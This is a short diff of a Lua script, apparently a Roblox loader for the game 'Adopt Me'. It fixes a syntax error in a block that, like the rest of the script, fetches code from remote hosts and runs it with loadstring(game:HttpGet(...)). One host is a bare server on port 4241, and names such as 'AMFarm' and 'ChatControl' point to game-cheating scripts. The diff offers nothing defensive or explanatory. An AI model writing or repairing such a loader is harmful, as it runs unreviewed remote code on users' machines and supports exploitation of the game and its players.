@@ -5,7 +5,8 @@ task.spawn(function()
     loadstring(game:HttpGet("http://ii.sebas.sbs:4241/adoptme/dashboard.lua"))()
 end)
 
-spawnfunction()
+spawn(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Reellzz/Reellzz/refs/heads/main/ChatControl"))()
 end)
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Reellzz/Reellzz/refs/heads/main/AMFarm"))()
